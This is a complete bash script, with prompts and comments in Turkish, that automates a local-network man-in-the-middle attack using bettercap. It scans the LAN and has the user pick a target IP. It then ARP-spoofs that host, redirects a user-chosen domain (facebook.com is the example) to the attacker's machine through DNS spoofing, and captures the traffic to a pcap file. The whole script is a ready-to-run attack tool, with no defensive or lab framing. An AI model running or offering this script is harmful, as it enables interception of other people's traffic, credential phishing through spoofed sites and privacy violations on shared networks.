#!/bin/bash

info() { echo -e "\e[34m[INFO]\e[0m $1"; }
warn() { echo -e "\e[33m[WARN]\e[0m $1"; }
good() { echo -e "\e[32m[OK]\e[0m $1"; }
fail() { echo -e "\e[31m[FAIL]\e[0m $1"; }

# root kontrolü
if [[ "$EUID" -ne 0 ]]; then
  fail "Bu script root olarak çalıştırılmalı!"
  exit 1
fi

# Ağ arayüzü tespiti
iface=$(ip route | grep default | awk '{print $5}')
if [[ -z "$iface" ]]; then
  fail "Ağ arayüzü tespit edilemedi!"
  exit 1
fi
good "Kullanılan ağ arayüzü: $iface"

# Bettercap kontrolü
if ! command -v bettercap &> /dev/null; then
  warn "Bettercap yüklü değil, yükleniyor..."
  apt update && apt install bettercap -y
fi

sysctl net.ipv4.ip_forward | grep -q "1" || {
  info "IP yönlendirme aktif değil, etkinleştiriliyor..."
  sysctl -w net.ipv4.ip_forward=1
}

info "Ağ taraması yapılıyor (5 saniye)..."
bettercap -iface "$iface" -eval "net.probe on; sleep 5; net.show" > bettercap_output.txt &
sleep 6

ip_list=($(grep -Eo "([0-9]{1,3}\.){3}[0-9]{1,3}" bettercap_output.txt | sort -u))
if [[ ${#ip_list[@]} -eq 0 ]]; then
  fail "Ağda cihaz bulunamadı!"
  exit 1
fi

echo -e "\nBulunan IP adresleri:"
for i in "${!ip_list[@]}"; do
  echo "[$((i+1))] ${ip_list[$i]}"
done


echo
read -p "Saldırmak istediğin hedefin numarasını seç (1-${#ip_list[@]}): " target_num
target_ip=${ip_list[$((target_num-1))]}

if [[ -z "$target_ip" ]]; then
  fail "Geçersiz seçim!"
  exit 1
fi
good "Hedef IP: $target_ip"

read -p "Yönlendirmek istediğin domain (örn: facebook.com): " spoof_domains
if [[ -z "$spoof_domains" ]]; then
  fail "Domain belirtmen gerekiyor!"
  exit 1
fi

attacker_ip=$(hostname -I | awk '{print $1}')
info "Spoof edilen alan adı $spoof_domains --> $attacker_ip yönlendirilecek"

info "MITM ve DNS spoof saldırısı başlatılıyor..."
bettercap -iface "$iface" -eval "
set arp.spoof.targets $target_ip;
arp.spoof on;
set dns.spoof.domains $spoof_domains;
set dns.spoof.address $attacker_ip;
dns.spoof on;
set net.sniff.output mitm.pcap;
net.sniff on;
"
